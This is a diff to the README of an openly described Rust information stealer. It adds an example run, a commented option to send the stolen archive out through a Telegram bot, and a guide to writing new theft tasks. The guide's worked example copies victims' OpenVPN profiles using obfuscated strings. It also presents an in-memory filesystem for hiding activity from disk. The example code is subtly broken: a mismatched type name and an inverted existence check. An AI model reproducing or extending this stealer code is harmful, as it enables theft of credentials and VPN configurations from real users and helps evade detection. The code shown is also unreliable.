@@ -115,6 +115,8 @@ When started, each task runs in its own thread.
 A composite task waits for all its subtasks to finish before it completes.
 
 The stealer **does not use the Rust standard library**.
+
+Example run
 ```rust
 use filesystem::path::Path;
 use ipinfo::init_ip_info;
@@ -127,6 +129,7 @@ use filesystem::FileSystem;
 use zip::ZipArchive;
 
 pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
+    // required step
     if !init_ip_info() {
         panic!("Failed to initialize IP info");
     }
@@ -136,10 +139,9 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     
     let out = Path::new("output");
     let _ = fs.mkdir(&out);
-    
-    unsafe {
-        SniffTask::new().run(&out, &fs, &collector);
-    }
+  
+    // running the stealer
+    SniffTask::new().run(&out, &fs, &collector);
 
     let displayed_collector = format!("{}", DisplayCollector(collector));
 
@@ -157,7 +159,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     
     // 2. or upload, like call upload_telegram
     //
-    // let _ = upload_telegram(env!("BOT_TOKEN"), zip);
+    // let _ = upload_telegram(env!("CHAT_ID"), env!("BOT_TOKEN"), zip);
   
     0
 }
@@ -199,6 +201,202 @@ where
         .send_archive(zip, collector)
 }
 ```
+
+### Tasks
+#### 1. Creating own task
+To integrate a custom task into the system, implement the [Task](https://github.com/sqlerrorthing/ShadowSniff/blob/master/tasks/src/lib.rs#L71) trait.
+
+#### 2. Task trait overview
+The Task trait has two main methods:
+1. ##### `parent_name() -> Option<String>`
+   This method returns an optional name that specifies a subdirectory where your task’s output should be written.
+
+   - If you return Some(name), your output files will be stored under the directory:
+     `<parent>/<name>/`
+   - If you return None, your output files will be written directly under the provided parent directory.
+
+   This gives your task flexibility to isolate its outputs or write flatly in the parent directory, depending on your use case.
+
+   The default implementation returns None, so if you don’t override this, your outputs go directly into parent.
+
+   #### Convenience Macro: `parent_name!`
+    
+   To make it easier to implement the parent_name method, the crate provides the `parent_name!` macro:
+   `parent_name($name:expr)`
+   
+   - This macro takes a string literal `$name` and generates an implementation of the `parent_name()` method that returns `Some(name)` wrapped in an obfuscated string for potential security or binary size benefits.
+   - Using this macro simplifies your implementation — instead of writing out the full method, you just write:
+     ```rust
+     impl<C: Collector, F: FileSystem> Task<C, F> for MyTask {
+         parent_name!("my_task_output");
+     
+         fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+             // your run logic here
+         }
+     }
+     ```
+     This way, you get a concise, safe, and consistent parent_name method without boilerplate.
+
+2. ##### `run(&self, parent: &Path, filesystem: &F, collector: &C)`
+   This method executes the actual task logic:
+   
+   - `parent`: The base directory where output should be written.
+   - `filesystem`: A filesystem abstraction implementing [`FileSystem`](https://github.com/sqlerrorthing/ShadowSniff/blob/master/filesystem/src/lib.rs) where you write files.
+   - `collector`: A statistics collector implementing [`Collector`](https://github.com/sqlerrorthing/ShadowSniff/blob/master/collector/src/lib.rs).
+
+   Your implementation should:
+
+   - Write all data only inside this (parent) path.
+   - Avoid panics and handle errors gracefully.
+
+#### 3. Example: Implementing a simple OpenVPN task
+```rust
+use alloc::borrow::ToOwned;
+use tasks::{parent_name, Task};
+use filesystem::{FileSystem, copy_content_with_filter, path::Path};
+use collector::Collector;
+use obfstr::obfstr as s;
+
+// define the struct
+pub struct OpenVPN;
+
+// impl Task trait
+impl<C: Collector, F: FileSystem> Task<C, F> for ExampleTask {
+    // to <parent>/OpenVPN folder
+    parent_name!("OpenVPN");
+    
+    // task entrypoint
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
+        // there is OpenVPN store their profiles
+        let profiles = Path::appdata() / s!("OpenVPN Connect") / s!("profiles");
+        
+        // nothing to do if the profiles doesn't exist
+        if StorageFileSystem.is_exists(&profiles) {
+            return;
+        }
+
+        // copy between filesystems to populate log file content
+        copy_content_with_filter(
+            // source filesystem
+            StorageFileSystem,
+            
+            // source path
+            profiles,
+            
+            // destination filesystem
+            filesystem,
+            
+            // destination path
+            parent,
+            
+            // filter, applied to each file being copy, 
+            // if return true - the file will copy
+            &|profile| {
+                profile.extension().map(|ex| ex.contains(s!("ovpn"))).unwrap_or(false)
+            }
+        )
+    }
+}
+```
+
+#### 4. Task groups (CompositeTask)
+Sometimes, a single task isn't enough — you might want to run multiple related tasks together. For that, the system provides a composite task mechanism that lets you define a group of tasks which all run in parallel.
+
+##### What is a Composite Task?
+A CompositeTask is a special type of task that holds and manages a list of other tasks. When executed, it:
+
+- Runs each inner task in its own thread.
+- Wait for all tasks to finish.
+- Stores output in a subdirectory if desired.
+
+This is useful for building logical task groups
+
+#### 5. Creating a Task Group
+Here's an example of a grouped task named VpnTask that runs a single sub-task OpenVPN, but is structured to support any number of tasks:
+
+```rust
+use alloc::borrow::ToOwned;
+use tasks::CompositeTask;
+use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
+use filesystem::{FileSystem, path::Path};
+use collector::Collector;
+
+pub struct VpnTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
+}
+
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for VpnTask<C, F> {
+    fn default() -> Self {
+        Self {
+            inner: composite_task!(
+                OpenVPN // and other tasks, divided by comma
+            ),
+        }
+    }
+}
+
+impl_composite_task_runner!(VpnTask<C, F>, "Vpn" /* the parent_name, optional */);
+```
+
+And if you want, add it to the main, "entrypoint" task - `SniffTask` if you are contributing the project
+```rust
+pub struct SniffTask<C: Collector, F: FileSystem> {
+    inner: CompositeTask<C, F>,
+    subtasks: Option<CompositeTask<C, F>>,
+}
+
+impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F> {
+    fn default() -> Self {
+        Self {
+            inner: composite_task!(
+                /* ... */,
+                VpnTask::default(),
+                /* ... */,
+            ),
+            subtasks: None
+        }
+    }
+};
+
+// ...
+```
+
+Or use `SniffTask` api and create the `SniffTask` instance with your task using:
+```rust
+fn main() {
+    SniffTask::with_subtasks(composite_task!(
+        VpnTask::default() // and other tasks, divided by comma
+    )).run(/* out */, /* filesystem */, /* collector */);
+}
+```
+
+### FileSystem
+All file operations in this system are abstracted using the FileSystem trait. This allows your code to work with multiple backends — such as the real Windows file system or an in-memory virtual one — without changing task logic.
+
+This design provides flexibility for:
+- Real-world use (e.g., writing to disk during deployment)
+- Hiding (e.g., writing into memory without touching the disk)
+
+#### The `FileSystem` trait
+The trait defines a complete interface for working with files and directories in a backend-agnostic way.
+
+It includes methods to: `read_file`, `write_file`, `create_file` and [etc](https://github.com/sqlerrorthing/ShadowSniff/blob/master/filesystem/src/lib.rs).
+
+#### Storage Backends
+Two key implementations of this trait are included:
+
+1. `StorageFileSystem` (*Real Filesystem*)
+   Target: Windows filesystem
+   Purpose: Used to communicate with real user filesystem
+
+2. `VirtualFileSystem` (*In-Memory*)
+   Target: RAM (no disk interaction).
+   Purpose: Used for temp files (if not big) and construct log file
+
+#### Copying Between Filesystems
+To support moving data across filesystems — e.g., from virtual memory to disk, or from a remote archive into the target output directory — several utility functions are provided.
+
+see [here](https://github.com/sqlerrorthing/ShadowSniff/blob/master/filesystem/src/lib.rs#L151-L308)
 
 ## Acknowledgments
 
